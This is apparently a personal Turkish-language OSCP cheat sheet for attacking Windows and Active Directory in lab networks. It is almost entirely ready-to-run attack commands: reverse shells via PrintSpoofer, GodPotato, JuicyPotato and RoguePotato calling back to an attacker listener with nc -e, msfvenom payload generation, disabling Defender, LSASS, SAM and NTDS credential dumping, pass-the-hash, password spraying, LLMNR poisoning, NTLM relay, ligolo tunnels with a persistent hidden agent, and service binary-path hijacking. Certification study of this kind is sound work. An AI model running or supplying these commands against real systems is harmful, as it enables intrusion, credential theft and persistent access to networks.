hashi aldık şimdi lateral movement yapcaz servis hesabına zıplıcaz
evil-winrm  -i 192.168.55.165 -u 'svc_apache$' -H  NTLMHASH
```

TOKEN IMPERSONATIONS

TOKEN IMPERSONATION - **SEIMPERSONATE PRIVILEGE & SEASSGINPRIMARYTOKEN PRIVILEGES**

Bu yöntem genellikle bir kullanıcı `SeImpersonatePrivilege` veya `SeAssignPrimaryTokenPrivilege` gibi ayrıcalıklara sahipse kullanılabilir.

```
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PRINTSPOOFER 

# Tamamen windows ortamında 
PrintSpoofer ile SYSTEM yetkili cmd başlat (PrintSpoofer.exe aynı klasörde olmalı)
PrintSpoofer.exe -i -c cmd.exe

# printspoofer ile daha kısa yol, kaliye shell aktarma 
kali: nc -nlvp 1337
windows: .\PrintSpoofer64.exe -c "nc.exe 192.168.2.111 1337 -e powershell" veya .\PrintSpoofer64.exe -c "nc.exe 192.168.2.111 1337 -e cmd"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GODPOTATO

WINDOWS 192.168.52.61											                                       KALI: 192.168.49.52
.\\GodPotato-NET4.exe -cmd ".\\nc.exe 192.168.45.174 1337 -e cmd.exe"	           nc -nlvp 1337
.\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe 10.10.14.x 1337 -e cmd"	
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
JUICYPOTATO 
Dikkat edilecekler:
Bu yöntem yeni Windows sürümlerinde (Windows 10 1809 sonrası) genellikle çalışmaz (patched). Defender reverse shell’i veya JuicyPotato’yu silebilir → önce devre dışı bırakman gerekebilir.
Bazı sistemlerde CLSID manuel seçmen gerekebilir,o zaman hata alırsan (COM hatası), işletim sistemine uygun CLSID bul ve -c ile ekle

# Kali:
nc -nlvp 1337

# Windows:
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a "192.168.45.174 1337 -e cmd" -t *
JuicyPotato.exe -l 1337 -p reverse.exe -t * -c {CLSID}
.\Juicy.Potato.x86.exe -l 1337 -p C:\wamp\tmp\nc.exe -a "192.168.45.174 1337 -e cmd" -t *
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ROGUEPOTATO
# KALI - NC:
nc -nlvp 1337

# WINDOWS:
# -r: Senin Kali IP'n
# -l: RoguePotato'nun dinleyeceği port (Socat buraya yönlendirecek)
.\RoguePotato.exe -r 10.10.14.x -e "C:\Windows\Temp\nc.exe 10.10.14.x 1337 -e cmd" -l 9999
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
															                                      
nc32 nc64 ayrımına dikkat et hata alırsan diğer nc yi çalıştır, çalıştırmadan önce platform kaç bit kontrol et

tünel içindeki makineden yetki yükseltme
şimdi tünele 80 portundan listener ekliyosun
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp

tünelleme yaparak eriştiğin makinede token impersonation ile yetki yükseltirken aşağıdaki komutu kullanırsın - burası önemli normal impersonate değil 
.\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.174.147 1337"
.\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.174.147 80"
```

ACTIVE DIRECTORY ENUMERATION

```
# ============================================================
# ACTIVE DIRECTORY ENUMERATION - OSCP CHEAT SHEET
# ============================================================

# ── 1. TEMEL CMD KOMUTLARI ───────────────────────────────────

whoami /priv                                      # Mevcut kullanıcının yetkilerini listele
whoami /groups                                    # Kullanıcının üye olduğu gruplar
net user /domain                                  # AD'deki tüm kullanıcıları listele
net user <kullanici> /domain                      # Belirli kullanıcının detaylarını göster
net group /domain                                 # Domain gruplarını listele
net group "Sales Department" /domain              # Grubun üyelerini listele
net group "Domain Controllers" /domain            # DC'nin IP'sini öğren
net group "Domain Admins" /domain                 # Domain admin'leri listele
net localgroup "Administrators"                   # Yerel admin grubunu göster (CMD)
Get-LocalGroupMember -Group "Administrators"      # Yerel admin grubunu göster (PowerShell)
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

# ── 2. POWERSHELL HAZIRLIK ───────────────────────────────────

powershell -ep bypass                             # Execution policy bypass (kısıtlı ortam için)
Set-MpPreference -DisableRealtimeMonitoring $true # Defender'ı devre dışı bırak

# ── 3. POWERVIEW KURULUM ─────────────────────────────────────
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Import-Module .\PowerView.ps1
# veya direkt çalıştır:
. .\PowerView.ps1

# ── 4. POWERVIEW - DOMAIN BİLGİSİ ───────────────────────────

Get-NetDomain                                                  # Domain genel bilgisi
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  # Alternatif domain bilgisi
Get-DomainSID                                                  # Domain SID'i öğren
Get-DomainPolicy                                               # Domain politikaları

# ── 5. POWERVIEW - KULLANICI ENUMERATİON ────────────────────

Get-NetUser                                                    # Tüm kullanıcıları listele
Get-NetUser | select cn, pwdlastset, lastlogon                 # Özet kullanıcı bilgisi
Get-NetUser | select cn, pwdlastset, lastlogon, description    # Description'da parola olabilir!
Get-NetUser -SPN                                               # Kerberoastable kullanıcıları bul
Get-NetUser -PreauthNotRequired                                # ASREPRoastable kullanıcıları bul

# ── 6. POWERVIEW - GRUP ENUMERATİON ─────────────────────────

Get-NetGroup | select cn                                       # Tüm grupları listele
Get-NetGroup "Domain Admins" | select member                  # Grubun üyelerini listele
Get-NetGroupMember "Domain Admins"                            # Domain admin üyelerini göster

# ── 7. POWERVIEW - BİLGİSAYAR ENUMERATİON ───────────────────

Get-NetComputer                                                # Tüm makineleri listele
Get-NetComputer | select dnshostname, operatingsystem, operatingsystemversion

# ── 8. POWERVIEW - SESSION & OTURUM ─────────────────────────

Get-NetSession -ComputerName <HOSTNAME>                       # Makinedeki aktif oturumları gör
Get-LoggedOnLocal -ComputerName <HOSTNAME>                    # Yerel oturum açmış kullanıcılar
Find-DomainUserLocation                                        # Hedef kullanıcının hangi makinede olduğunu bul

# ── 9. POWERVIEW - PAYLAŞIM & SYSVOL ────────────────────────

Find-DomainShare                                               # Tüm domain paylaşımlarını tara
Find-DomainShare -CheckShareAccess                            # Erişebildiğin paylaşımları listele
ls \\dc1.corp.com\sysvol\corp.com\                            # SYSVOL içinde GPP/şifre ara

nslookup.exe <HOSTNAME>.<DOMAIN>                              # Hostname → IP çözümle

# ── 10. POWERVIEW - ACL & YETKİ KONTROLÜ ────────────────────

Get-ObjectAcl -Identity <kullanici>                           # Kullanıcının ACL'lerini göster
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs        # GUID'leri çözümleyerek göster
Find-InterestingDomainAcl -ResolveGUIDs                       # İstismar edilebilir ACL'leri bul
```

TÜNELLEME

```jsx
LINUX DAN LINUXA

# KALI - Dosyaları çıkar
ligolo-ng_agent_0.8.1_linux_amd64.tar.gz
ligolo-ng_proxy_0.8.1_linux_amd64.tar.gz

# KALI - Tünel arayüzünü oluştur (Bu şart!)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# KALI Proxy'yi başlat (Güvenli port 443'ü kullanalım, firewall'a takılmasın)
sudo ./proxy -selfcert -laddr 0.0.0.0:443

# Agent dosyasını karşıya aktar
# KALI Python ile bir web sunucusu aç (Dosyayı hedefe çekmek için)
sudo python3 -m http.server 80

# TARGET MACHINE
cd /tmp
wget http://<KALI_IP>/agent
chmod +x agent  
# eğer bu adımda hata alırsan izin yoksa başka dizinde dene cd /dev/shm 2. yol mevcut agent dosyasına dokunamıyorsan, yeni bir isimle kopyala. Kendi oluşturduğun dosyada tam yetkin olur 
# cp agent agent_yeni
chmod +x agent_yeni
./agent -connect <KALI_IP>:443 -ignore-cert &       #Agent'ı Kali'ye bağla (Portu 443 yapmıştık)

# KALI proxy ekranı 
session yaz ve Enter'a bas. (Bağlı agent'ı göreceksin, yanında ID: 1 yazar).
session --id 1 yaz (Bağlantıyı seçtin).
start yaz (Tünel başladı!).

# 4. Adım: Rotaları Ekle (En Önemli Kısım) 
Aşağıdakini hedef makinede yapıyorsun 
önce kurban makinenin hangi iç ağları gördüğüne bak (ip a veya ifconfig ile)

Bunu da kalide yapıyorsun
# İç ağ rotasını Kali'ye tanıt
sudo ip route add 192.168.110.0/24 dev ligolo

----------------------------------------------
Eğer birşeyler ters giderse ve herşeye sıfırdan başlamak istersen 
# Kalide eski tüneli sil
sudo ip link delete ligolo
# Yeniden oluştur
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# geri kalanı yukarıda var ordan devam edersin, bir de aşağıdaki gibi rotayı tekrar tanımla, ligolo interfa silininde rota da gider 
sudo ip route add 192.168.110.0/24 dev ligolo

// konudan bağımsız olarak eklediğin rotayı görmek için --> ip route show 

----------------------------------------------
Tünelin Kopmasını Engellemek İçin "Ölümsüz" Agent Yöntemi
Eğer sorun temizlik scriptiyse, agent'ı şöyle çalıştırarak shell kapansa bile ayakta kalmasını sağlayabilirsin:

TARGET MAKİNEDE ÇALIŞTIRACAKSIN 

# Dosyayı Riley'nin ana dizinine kopyala (silinmemesi için)
cp agent /home/riley/.local/share/agent
chmod +x /home/riley/.local/share/agent

# Agent'ı arka planda "kopmaz" şekilde çalıştır
nohup /home/riley/.local/share/agent -connect <KALI_IP>:443 -ignore-cert > /dev/null 2>&1 &

Not: nohup komutu, sen shell'den çıksan veya terminal kapansa bile işlemin devam etmesini sağlar. > /dev/null 2>&1 kısmı ise çıktıları gizler.

# ── 6. SIFIRLAMA (Bir şeyler ters giderse) ───────────────────

sudo ip link delete ligolo                        # Eski tüneli sil
sudo ip tuntap add user kali mode tun ligolo      # Yeniden oluştur
sudo ip link set ligolo up
sudo ip route add 192.168.110.0/24 dev ligolo     # Rotayı tekrar tanımla

windowsda da aynı, sadece agent.exe kullanıyorsun agent yerine 
```

ssh ile içerdeki trafiği dışarı aktarma

```
içerde 8000 portu açıktır mesela 
ssh burak@192.168.128.246 -i id_ecdsa -p 2222 -N -L 8000:127.0.0.1:8000
ssh burak@192.168.128.246 -p 2222 -N -L 8000:127.0.0.1:8000
```

ahmetin yöntemi - tünelleme

KALİ

```bash
└─$ sudo ip tuntap add user kali mode tun ligolo ## arayüz ekledim.
└─$ sudo ip link set ligolo up ## ligolonun ağ adaptörünü etkinleştirdim.
└─$ ./proxy -selfcert ## sunucuyu çalıştırdım.
```

HEDEF MAKİNE

```powershell
PS> .\\agent.exe -connect 192.168.45.163:11601 -ignore-cert
```

KALİ

```
listenera gel 
session	1
start

kali yeni terminal
sudo ip route add 10.10.210.0/24 dev ligolo ## proxy sunucusuna yeni rota ekledim

eğer reverse shell ve file transfer gibi olaylara girişeceksen
listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80
```

PASSWORD SPRAY ATTACKS

```
Password Spray <https://github.com/r00t-3xp10it/redpill/blob/main/modules/Spray-Passwords.ps1>

PS C:\\Tools>powershell -ep bypass
PS C:\\Users\\jeff>net accounts

Method 1: //admin kullanıcısına
PS C:\\Tools>.\\Spray-Passwords.ps1 -Pass Nexus123! -Admin

Method 2: //users.txt kullanıcılarına
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Winter2025"

Method 3: // bir parolayı tüm kullanıcılara: <https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe>
PS C:\\>.\\kerbrute_windows_amd64.exe passwordspray -d corp.com .\\usernames.txt "Nexus123!"

Method 4: //tüm kombinasyonları deneme yöntemi, ama bu hesapları kilitleyebilir, oscp de sıkıntıya sokar,
PS C:\\>.\\kerbrute_windows_amd64.exe bruteuser -d corp.com .\\passwords.txt .\\usernames.txt
```

LSASS DUMP

```
LSASS (Local Security Authority Subsystem Service)
Windows’ta kullanıcı oturumlarını, şifre hash’lerini ve kimlik doğrulama verilerini yöneten bir sistem servisidir.

> LSASS = “Hash kasası” gibi düşün.
> Dump = “Beynini alıp incelemek” gibi.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Neden Yapılır?

LSASS’ı dump'lamak = içindeki kullanıcı şifrelerini ve hash'lerini çıkarmak demektir.
LSASS dump ile:

NTLM / LM hash'leri alırsın
TGT/TGS** bileti varsa çıkarırsın
Parolalar düz yazı olarak bulunabilir (özellikle RDP, runas, outlook, vs. varsa)
Pass-the-Hash, Pass-the-Ticket, Offline cracking yapabilirsin

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Nasıl Yapılır? (En yaygın 3 yöntem)
### 1. **Mimikatz ile doğrudan dump**

privilege::debug
sekurlsa::logonpasswords

Ama bu genelde sadece yerel olarak çalışır (örneğin Meterpreter shell içinden).

### 2. ProcDump ile dump al, sonra analiz et

procdump.exe -ma lsass.exe lsass.dmp

→ Sonra lsass.dmp dosyasını mimikatz ile analiz edebilirsin:

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
OSCP için Gerekli mi?: Evet önemlidir özellikle:

Windows makinelerinde privesc sonrası (örneğin administrator shell aldıysan)
Hash çekip başka makinelere geçiş (Lateral Movement) yapmak için
Flag erişimi için RDP/SMB yapılacaksa
Bazı makinelerde sadece bu dump’tan parola elde edilebilir

Özetle:
 ________________________________________________________________________
| Başlık            | Detay                                              |
| ----------------- | -------------------------------------------------- |
| Amaç              | Parola / hash / ticket çekmek                      |
| Kullanıldığı yer  | Privilege escalation sonrası                       |
| OSCP’de çıkar mı? | Evet – özellikle Windows privesc sonrası.          |
| Gereken araçlar   | mimikatz, procdump, meterpreter                    |
| Alternatifi       | DCSync (sessiz), Credential Dump (token üzerinden) |
|________________________________________________________________________|
```

SAM & SYSTEM DUMP

```
1. Admin shell'de SAM ve SYSTEM dosyalarını kaydet (Windows CMD)
reg save HKLM\\SAM sam.save
reg save HKLM\\SYSTEM system.save

2. Dosyaları Kali'ye atmak için Python HTTP server aç (Windows PowerShell)
python -m http.server 8080

Kali'de dosyaları indir
wget http://<victim-ip>:8080/sam.save
wget http://<victim-ip>:8080/system.save

3. Hashleri çıkarmak için secretsdump.py kullan (Kali)
secretsdump.py -sam sam.save -system system.save LOCAL
veya
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

4. Hash kırmak için hashcat (NTLM mode 1000)
hashcat -m 1000 hash.txt rockyou.txt --force

veya john ile kır
john --format=NT hash.txt --wordlist=rockyou.txt

5. Pass-the-Hash ile başka makinaya bağlanmak (crackmapexec örnek)
crackmapexec smb 10.10.10.5 -u Administrator -H <NTLM_HASH>

veya psexec.py (Impacket)
psexec.py Administrator@10.10.10.5 -hashes :<NTLM_HASH>

SAM dosyası:
C:\\Windows\\System32\\config\\SAM

SYSTEM dosyası:
C:\\Windows\\System32\\config\\SYSTEM
```

LATERAL MOVEMENT

SHADOW COPIES

```
Amaç:
Active Directory'deki tüm kullanıcıların NTLM hash'lerini ve Kerberos keylerini çekmek. Bunun için:
- ntds.dit dosyasına,
- SYSTEM hive’ına ihtiyacımız var.

Bu iki dosya sayesinde hash dump yapılır.

Sorun:
C:\\Windows\\NTDS\\ntds.dit dosyası kullanımda (locked) olduğu için doğrudan kopyalanamaz.

Çözüm:
Microsoft'un Shadow Copy (VSS) özelliğini kullanarak sistemin anlık görüntüsünü alırız. Bu snapshot, dosyaların kilitli olmayan bir versiyonunu sağlar.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Adımlar:

### 1. Shadow Copy Oluştur
C:\\Tools>vshadow.exe -nw -p C:

- nw: Writers devre dışı (daha hızlı snapshot).
- p: Shadow copy diskte saklansın.

Bu komuttan sonra aşağıdaki gibi bir path görürsün:
Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2
Bu, C:\\ sürücüsünün bir snapshot’ıdır.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 2. ntds.dit Dosyasını Kopyala

Snapshot içinde bu dosyayı kilitsiz haliyle alabilirsin:

copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak

> Bu path = snapshot + orijinal ntds.dit yolu
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 3. SYSTEM Hive'ı Kaydet

Bu da offline hash çözmek için lazım:

reg.exe save hklm\\system c:\\system.bak

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 4. Dosyaları Kali'ye Al (örnek)

scp user@victim-ip:C:\\ntds.dit.bak .
scp user@victim-ip:C:\\system.bak .

Ya da smbserver.py + copy ile Kali'ye yollarsın.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### 5. Kali'de Dump Et

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

Bu komut:

SYSTEM dosyasından bootkey alır,
ntds.dit içindeki şifreleri çözmek için kullanır,
Tüm kullanıcıların NTLM hash’lerini, Kerberos keylerini gösterir.

Sonuç:

Artık şu bilgileri elinde tutuyorsun:

administrator, krbtgt, vs. tüm kullanıcı hash'leri
Bunları crack edebilir ya da Pass-The-Hash ile doğrudan kullanabilirsin

------------------------------------------------------------------------------------------------------------------------------------------------------------------------
ADIMLAR ÖZET

### 1. Shadow Copy Oluştur
C:\\Tools>vshadow.exe -nw -p C:

### 2. `ntds.dit` Dosyasını Kopyala
copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak

### 3. SYSTEM Hive'ı Kaydet
reg.exe save hklm\\system c:\\system.bak

### 4. Dosyaları Kali'ye Al (örnek)

scp user@victim-ip:C:\\ntds.dit.bak .
scp user@victim-ip:C:\\system.bak .

### 5. Kali'de Dump Et
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

LLMNR POISONING

```
KALİDE
sudo responder -I eth0
WINDOSTA
Invoke-WebRequest -Uri "\\\\nonexistenthost\\share"
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt # hashcat ile kırma, mod 5600 seçilir. NTLMv2 hash modu

SONUÇ OLARAK
- Kullanıcı ağda yanlış ya da çözülemeyen bir adres yazdı.
- Bu ismi çözmeye çalışırken NBT/LLMNR yayını gönderdi.
- Responder bunu yakalayıp sahte cevap verdi (Poisoning).
- Ardından kullanıcı cihazı sana NTLM hash gönderdi.
- nbtscan ile NetBIOS yayını yapan makineleri gördük.
- Responder ile hangilerinin yayın yaptığına ve bunlara karşılık olarak hash gönderdiğine şahit olduk.
- Böylece aktif olarak kimler savunmasız yayın yapıyor, kimden kimlik bilgisi çalabilirim bunları öğrenmiş olduk.
```

RELAY ATTACKS - NTLM RELAY

```
Net-NTLMv2 Relay Attack

Terminalde Responder'ı başlat, eth0 senin ağ arayüzün:
sudo responder -I eth0

Başka bir terminalde, Impacket’in NTLMRelayX aracını kullanarak relay saldırısını başlat:
sudo ntlmrelayx.py -tf targets.txt -smb2support

**Alternatif:** Eğer hedef tek IP ise:
sudo ntlmrelayx.py -t 10.10.10.50 -smb2support

Kurbanın Bağlantı Kurması
- Kurban, SMB ile paylaşıma bağlanmaya çalışır (örneğin \\\\attacker-ip\\share). -->  \\\\10.10.10.100\\paylasim
- Kimlik doğrulama isteği Responder tarafından yakalanır.

Relay saldırısı sırasında komut çalıştırmak için NTLMRelayX.py’ye ek parametre verilebilir:
sudo ntlmrelayx.py -t 10.10.10.50 -smb2support -c "whoami"

Önemli Notlar
- Hedef sistemde SMB Signing açık ise bu saldırı başarısız olur. Çünkü imzalama relay'i engeller.
- Ayrıca, Windows Defender ve benzeri korumalar da saldırıyı fark edebilir.

==============================================================================================================================================================================================
SMB Relay Attack
Burada saldırgan, gerçek kullanıcıdan gelen **Net-NTLM veya Net-NTLMv2** kimlik doğrulama mesajlarını **değiştirmeden** başka bir SMB servisine relay eder.
```

IMPACKET

```
Bu araçlar, özellikle Windows ortamında lateral movement, hash dump, Kerberoasting, SMB/LDAP relay gibi saldırılarda kullanılır ve OSCP'de kritik öneme sahiptir.
En Önemli IMPACKET Araçları
==============================================================================================================================================================================================
### 1. secretsdump.py

Hedef sistemden NTLM hash’lerini ve LSA secrets verilerini dump eder.
Kullanım:

impacket-secretsdump htb.local/burak:Password123@10.10.10.161

Eğer shell aldıysan ve yerel dump yapıyorsan:

python3 secretsdump.py -system SYSTEM -sam SAM -security SECURITY LOCAL
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

-security, dump işlemine daha fazla bilgi eklemek içindir. Zorunlu değildir ama verimli analiz için önerilir.
Özellikle şifreli parolaların çözülmesi ve LSA Secrets gibi bilgilerin alınabilmesi için gereklidir.

==============================================================================================================================================================================================
### 2. wmiexec.py

Uzak Windows sistemde komut çalıştırmak için WMI (Windows Management Instrumentation) kullanır. Fileless çalışır (antivirüs daha zor fark eder).

impacket-wmiexec htb.local/burak:Password123@10.10.10.161

==============================================================================================================================================================================================
### 3. psexec.py

SMB üzerinden servis yaratarak uzak sistemde komut çalıştırır. AV tarafından daha kolay yakalanır.

impacket-psexec htb.local/burak:Password123@10.10.10.161

==============================================================================================================================================================================================
### 4. smbexec.py

PsExec'e benzer ama farklı bir yöntemle komut çalıştırır. Daha stealth olabilir.

impacket-smbexec htb.local/burak:Password123@10.10.10.161

==============================================================================================================================================================================================
### 5. atexec.py

Windows'un zamanlayıcı özelliğini (Task Scheduler) kullanarak komut çalıştırır.

impacket-atexec htb.local/burak:Password123@10.10.10.161 "whoami"

==============================================================================================================================================================================================
### 6. GetUserSPNs.py

Kerberoasting saldırısı yapar. SPN'li kullanıcıların TGS bileti çekilip offline brute-force yapılabilir.

python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

==============================================================================================================================================================================================
### 7. ntlmrelayx.py

Net-NTLMv2 relay attack yapar. Responder ile birlikte çalışır.

python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

==============================================================================================================================================================================================
### 8. rpcdump.py

Hedef makinedeki RPC servisleri hakkında bilgi toplar.

python3 rpcdump.py 10.10.10.161

==============================================================================================================================================================================================
### 9. lookupsid.py

Hedef sistemde SID brute force yaparak kullanıcı ve grup isimlerini enum eder.

python3 lookupsid.py htb.local/burak:Password123@10.10.10.161
==============================================================================================================================================================================================
### 10. dcomexec.py

DCOM üzerinden uzak komut çalıştırmak için kullanılır (alternatif komut yürütme yöntemi).

python3 dcomexec.py htb.local/burak:Password123@10.10.10.161
==============================================================================================================================================================================================
### 11. addcomputer.py

Domain ortamında bir bilgisayar hesabı (machine account) oluşturur. Kerberos relay sonrası kullanılabilir.

python3 addcomputer.py -dc-ip 10.10.10.10 htb.local/user:pass
==============================================================================================================================================================================================
## Hash ile Kullanım (Pass-the-Hash)

Çoğu Impacket aracı, parola yerine NTLM hash ile de çalışır:
impacket-psexec htb.local/burak@10.10.10.161 -hashes a******************************:4***********************

Hangi Aracı Ne Zaman Kullanmalıyım?
 ______________________________________________________________
| Durum                          | Araç                        |
| ------------------------------ | --------------------------- |
| Hash dump                      | secretsdump.py              |
| Uzak shell (fileless, stealth) | wmiexec.py                  |
| SMB relay                      | ntlmrelayx.py + responder   |
| Kerberoasting                  | GetUserSPNs.py              |
| Komut yürütme (servis)         | psexec.py / smbexec.py      |
| RPC veya SID enum              | rpcdump.py, lookupsid.py    |
|______________________________________________________________|

imapcket mssqlclient ile sql servisine bağlanma
impacket-mssqlclient sql_svc:testuser@10.10.100.100 -windows-auth
```

PSEXEC

```
1. Kullanıcı adı ve şifre ile

impacket-psexec DOMAIN/username:password@target-ip
impacket-psexec htb.local/administrator:Password123!@10.10.10.10

2. Sadece kullanıcı adı ve şifre (domain'siz)

impacket-psexec username:password@target-ip
impacket-psexec administrator:Password123!@10.10.10.10

3. NTLM Hash ile (Pass-the-Hash)

impacket-psexec DOMAIN/username@target-ip -hashes <LMHASH>:<NTHASH>
impacket-psexec test.local/administrator@10.10.10.10 -hashes a******************************:4***********************

4. Komut çalıştırmak (interactive shell yerine)

impacket-psexec administrator:Password123!@10.10.10.10 -cmd "ipconfig /all"

py dosyası ile

| Ne Yapmak İstiyorsun   | Komut Örneği                           |
| ---------------------- | -------------------------------------- |
| Parola ile shell açmak | psexec.py domain/user:pass@ip          |
| Hash ile shell açmak   | psexec.py domain/user@ip -hashes lm:nt |
| Komut çalıştırmak      | psexec.py domain/user:pass@ip "whoami" |
| Workgroup hedefi       | psexec.py WORKGROUP/user:pass@ip       |
```

EXPLOIT SUGGESTOR  & NEXT GENERATION EXPLOIT SUGGESTOR

```
NEXT GENERATION : <https://github.com/bitsadmin/wesng>

git clone <https://github.com/bitsadmin/wesng.git>
wes.py --update
systeminfo > systeminof.txt
wes.py sysyeminfo.txt

Exploit suggestor: <https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

python windows-exploit-suggester.py --update
python windows-exploit-suggestor.py --database 2024-08-08-mssb.xls --systeminfo systeminfo.txt
```

WINDOWS KERNEL EXPLOITS LIBRARY: <https://github.com/SecWiki/windows-kernel-exploits>

WINDOWS PRIVILEGE ESCALATION

Enumeration aracı olarak birçok araç olsa da genellikle bütün kontrolleri sağlayıp herşeyi tek çıktıda almamızı sağlayan WinPeas aracını kullanacağız.

<https://github.com/peass-ng/PEASS-ng/releases/tag/20250424-d809>[57fb](https://github.com/peass-ng/PEASS-ng/releases/tag/20250424-d80957fb)

Burada tercih ettiğimiz sürüm Windows için [**winPEASany.exe**](https://github.com/peass-ng/PEASS-ng/releases/download/20250424-d80957fb/winPEASany.exe) Servisler üzerinde hangi yetkilerimizin olduğunu kontrol etmek için kullanacağımız diğer araç ise accesschk.exe aracıdır. `http://live.sysinternals.com/accesschk.exe`

**accesschk.exe kullanımı**

```jsx
Bir dosyanın haklarını görüntüleme
accesschk.exe -uvwq TFTP.EXE

Dizindeki haklarımızı görüntüleme
.\\accesschk.exe /accepteula -uwdq "C:\\Program Files\\Unquoted Path Service\\"
```

**Dosya üzerine yazma**

```jsx
Windows
cmd
copy /Y budosyayıtestexeüzerineyazıyoruz.exe test.exe
copy /Y "C:\\Users\\wario\\Documents\\auditTracker.exe" "C:\\DevelopmentExecutables\\auditTracker.exe"
copy /Y "C:/Users/wario/Documents/auditTracker.exe" "C:/DevelopmentExecutables/auditTracker.exe"
powershell
Copy-Item -Path "C:\Users\wario\Documents\auditTracker.exe" -Destination "C:\DevelopmentExecutables\auditTracker.exe" -Force

LINUX 
wget http://192.168.45.221:8080/reverse-shell.sh -O /tmp/reverse-shell.sh şu komut burda dursun lazım olabilir 
```

Windows Servis enumeration

```jsx
cmd:         wmic service get name,displayname,pathname,startmode |findstr /i "auto"  
powershel:   Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object {$_.StartMode -eq "Auto"}
```

**1) Exploiting Insecure Service Permissions – daclsvc**

DACL, Windows işletim sistemlerinde, bir nesneye (dosya, klasör, hizmet vb.) erişim izinlerini tanımlayan bir güvenlik listesi türüdür. Bu liste üzerinde çalışan daclsvc servisinde eğer yazma hakkımız varsa **servisin binary path’ini**, yani o servisin çalıştırılabilir dosyasının tam yolunu kendi oluşturduğumuz reverse shell yolu ile değiştirirsek ve kali üzerinden bir dinleyici açarsak, servisi çalıştırdığımız zaman reverse shell çağırılır ve admin haklarıyla dinleyicimizde bir shell elde ederiz.

```
Reverse shellimizi oluşturalım
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.114.104 lport=4444 -f exe -o reverse.exe

Oluşturduğumuz reverse shell dosyasını windows makinasına aktarmak için smb server açalım.
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

windows makinasına xfreerdp ile bağlanıp reverse shell dosyasını alalım
copy \\\\10.10.114.104\\kali\\reverse.exe C:\\PrivEsc\\reverse.exe

Kali üzerinden netcat açalım ve windows komut satırını kaliye aktararak rahat rahat çalışalım.
kali --> nc -nlvp 4444
windows --> .\\reverse.exe

Erişim elde edilen windows makinada winpeas çalıştırılır.
C:\\PrivEsc>winPEASany.exe
çıktı şöyle birşey olur:
	daclsvc(DACL Service)["C:\\Program Files\\DACL Service\\daclservice.exe"] - Manual - Stopped
	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

Bu komut, daclsvc servisi üzerinde, user adlı kullanıcının yazma, değiştirme ve diğer erişim izinlerini denetler.
accesschk.exe /accepteula -uwcqv user daclsvc

Servisin binary path bilgisini alalım.
sc qc daclsvc

Amacımız binary path bilgisini bizim reverse shell yolu ilde değiştirip servisi çalıştırmak, tabi arkada dinleyicimizi de çalıştıracağız.
sc config daclsvc binpath= "\\"C:\\PrivEsc\\reverse.exe""  --> hata alırsan şunu dene --> sc config daclsvc binpath= "\\"C:\\PrivEsc\\reverse.exe\\""
net start daclsvc

Servisi çalıştırdığımızda dinleyicide admin yetkisiyle bir shell gelir.
nc -nlvp 4444

Not: Herhangi bir servisi çalıştırırken net start servis_ismi komutunu, servisi durdururken net stop servis_ismi Komutunu kullanırız.
```

Service Exploits - Unquoted Service Path

Bu zafiyet, servis yolu tırnak işaretlerine alınmadığında ve dosya isimleri boşluk içerdiğinde Windows’un servis yolunu düzgün yorumlayamamasına yol açar. Windows, çalıştırılmak istenen dosyayı en üst dizinden başlayarak, her alt dizinde mevcut dosyaları kontrol eder. Eğer yazma iznimiz olan bir dizin varsa, burada zararlı bir reverse shell dosyası oluşturulup, dosya ismi bir alt dizinin ismi ile değiştirilirse, Windows, servis dosyasını ararken bizim reverse shell dosyamıza ulaşır ve çalıştırır. Servis genellikle yönetici haklarıyla çalıştığı için, elde edilen shell admin (root) haklarıyla gelir.

